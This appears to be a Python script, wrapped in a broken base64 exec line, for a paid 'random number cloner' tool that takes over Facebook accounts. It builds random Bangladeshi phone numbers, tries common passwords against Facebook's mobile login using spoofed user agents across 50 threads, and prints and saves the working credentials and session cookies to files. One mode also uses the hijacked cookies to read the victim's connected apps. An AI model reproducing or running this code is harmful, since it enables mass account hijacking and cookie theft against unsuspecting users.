# Obfuscated by Py Compile
# Created by HTR-TECH (https://github.com/htr-tech)
# Instagram : @tahmid.rayat

import base64
exec(base64.b64decode('
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')
R = '\033[1;31m' # PUTIH
G = '\033[1;32m' # PUTIH
H = '\033[1;32m' # PUTIH
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
MXD = '\033[1;92m' #MAHADIGREEN
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By SPY")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
mnum=[]
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 12; Nokia XR20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for spy in range(9993,176281):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='TRT-L53 Build/HUAWEITRT-L53; wv)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/192.0.0.34.85;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "→".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/JUBUtheNOOB/approval.txt/main/Approval.txt').text
  
 

  os.system(" clear")                          
  print("""\x1b[1;97m
             
 
  #####  ####### #     # #     # ### #    # 
 #     # #     # #     # ##   ##  #  #   #  
 #       #     # #     # # # # #  #  #  #   
  #####  #     # #     # #  #  #  #  ###    
       # #     # #     # #     #  #  #  #   
 #     # #     # #     # #     #  #  #   #  
  #####  #######  #####  #     # ### #    # 
                                            

                                                        
                                                        
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : Soumik Ahmed 😈        │
    │ [✓] GITHUB   : soumik956 💗       │
    │ [✓] TYPE     : PRIMIUM,$               │
    │ [✓] WHATSAPP : +8801773147714         │
    │ [✓] VERSION  :  2.0                   │
    │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
    └───────────────────────────────────────┘""")
  
  print(f"\t \033[1;32m  FOllOW MY WHATSAPP NUMBER TO GET APPROVEL\033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  FIRST GET APPROVEL 7Day 100TK\033[1;37m ")
  print(f"")
  print(f" \033[1;32m  THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
  print(f"")
  print(f"\x1b[1;92m   contract Admin to Buy this Tools                                                               ");time.sleep (0.1) 
  print(f"")
  print(f"\033[1;32     YOUR  KEY : "+id)
  print(f"")
  print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
  print(f"")
  print(f"  Follow Admin Facebook ID,,,,,,,,,,,,,,,,,    ");time.sleep(1)
  os.system(f'xdg-open https://wa.me/qr/DDORIT4DOVVGB1')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/Soumik956/APVL/main/Approval.txt").text
    if id in httpCaht:
      print("\033[1;92m   YOUR KEY APROVED  ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      
      print(f"\x1b[1;92m    Sorry Bro Your Key not Aproved ")
      print(f"    Send payment to Admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open https://wa.me/qr/DDORIT4DOVVGB1'+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	menu_apikey()
menu_apikey()
logo=(f"""\x1b[1;97m
             
 #####  ####### #     # #     # ### #    # 
 #     # #     # #     # ##   ##  #  #   #  
 #       #     # #     # # # # #  #  #  #   
  #####  #     # #     # #  #  #  #  ###    
       # #     # #     # #     #  #  #  #   
 #     # #     # #     # #     #  #  #   #  
  #####  #######  #####  #     # ### #    # 
                                            

                                                        
                                                        
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : Soumik Ahmed 😈         │ 
    │ [✓] GITHUB   : soumik956 💗       │
    │ [✓] TYPE     : PRIMIUM,$                │
    │ [✓] WHATSAPP : +8801773147714         │
    │ [✓] VERSION  :  2.0                   │
    │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
    └───────────────────────────────────────┘""")
def cek_apk(session,coki):
	w=session.get("https://www.facebook.com/soumik956",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
def Main():
	os.system('clear')
	print(logo)
	print('[1] BD Number Cloner [CP-OK MIX] ')
	print("[2] BD Number cloner [Only Ok]")
	print("[3] BD Number cloner [APK] ")
	print("[4] Contract Admin [Report a problem]")
	print('[0] Back')
	print(54*'_')
	opt = input('Choose option >>> ')
	if opt =='1':
		virus()
	if opt =='2':
		virus2()
	if opt =='3':
		virus3()
	if opt =='4':
		admin()
	elif opt =='0':
		exit()
	else:
		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
		Main()
def admin():
	os.system('clear')
	print(logo)
	print(50*'_')
	print(' [1] Contract WhatsApp ')
	print(' [2] Follow Facebook ')
	print(' [3] Subscribe Youtube')
	print(' [0] Back to Main menu')
	bal = input('Choose option >>> ')
	if bal =='1':
		os.system('xdg-open https://wa.me/qr/VADCJ4PMWKZOM1');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/soumik956');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://www.youtube.com/@jubuthenoob22');time.sleep(1)
		admin()
	if bal =='0':
		Main()
	
def virus():
	user=[]
	os.system('clear')
	print(logo)
	print(" Sim code Example : 016, 017, 018, 019")
	kode = input(' [💀] Enter sim code: ')
	doamin = ' BD Number id cloner [CP-OK MIX] '
	limit = int(input('[?] Number add Limit : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(' [💔]  Total ids:\033[1;92m '+tl)
		print(f' [💔]  Usaragents : '+str(len(ugen)))
		print(f' [💔]\033[1;97m  target sim code :\033[1;92m {kode} ')
		print(f"\033[1;97m [💔]  version:\033[1;92m {doamin}")
		print(' \033[1;97m[💔]  The process has been started')
		print(' [💔]  use airplane mode if ok ids not come ')
		print(50*'_')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
			yaari.submit(a,uid,pwx,tl)
	print(50*'_')
	print(' [💔] Crack process has been completed')
	print(' [💔] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()
def virus2():
	user=[]
	os.system('clear')
	print(logo)
	print(" Sim code Example : 016, 017, 018, 019")
	kode = input(' [★] Enter sim code: ')
	doamin = ' BD Number id cloner [ONLY-OK] '
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(' [🤫]  Total ids:\033[1;92m '+tl)
		print(f' [🤫]  Usaragents : '+str(len(ugen)))
		print(f' [🤫]\033[1;97m  target sim code :\033[1;92m {kode} ')
		print(f"\033[1;97m [🤫]  version:\033[1;92m {doamin}")
		print(' \033[1;97m[🤫]  The process has been started')
		print(' [🤫]  use airplane mode if ok ids not come ')
		print(50*'_')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
			yaari.submit(b,uid,pwx,tl)
	print(50*'_')
	print(' [🤫] Crack process has been completed')
	print(' [🤫] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()
def virus3():
	user=[]
	os.system('clear')
	print(logo)
	print(" Sim code Example : 016, 017, 018, 019")
	kode = input(' [💀] Enter sim code: ')
	doamin = ' BD Number id cloner [APK] '
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(' [❤️‍🔥]  Total ids:\033[1;92m '+tl)
		print(f' [❤️‍🔥]  Usaragents : '+str(len(ugen)))
		print(f' [❤️‍🔥]\033[1;97m  target sim code :\033[1;92m {kode} ')
		print(f"\033[1;97m [❤️‍🔥]  version:\033[1;92m {doamin}")
		print(' \033[1;97m[❤️‍🔥]  The process has been started')
		print(' [❤️‍🔥]  use airplane mode if ok ids not come ')
		print(50*'_')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
			yaari.submit(c,uid,pwx,tl)
	print(50*'_')
	print(' [😭] Crack process has been completed')
	print(' [🤣] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()
def a(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSAS×1\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [SAS-OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                open('/sdcard/SAS-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\r\x1b[38;5;196m[cp] {uid}|{ps}")
                open('/sdcard/SAS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass
def b(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSAS\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [SAS-OK😘] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;92m [🔢] Number : {uid}')
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/SAS-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    except:
        pass
def c(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSAS\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [SAS-OK😘] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;92m [🔢] Numer : {uid}')
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/SAS-OK.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
    except:
        pass
Main()
Footer
'))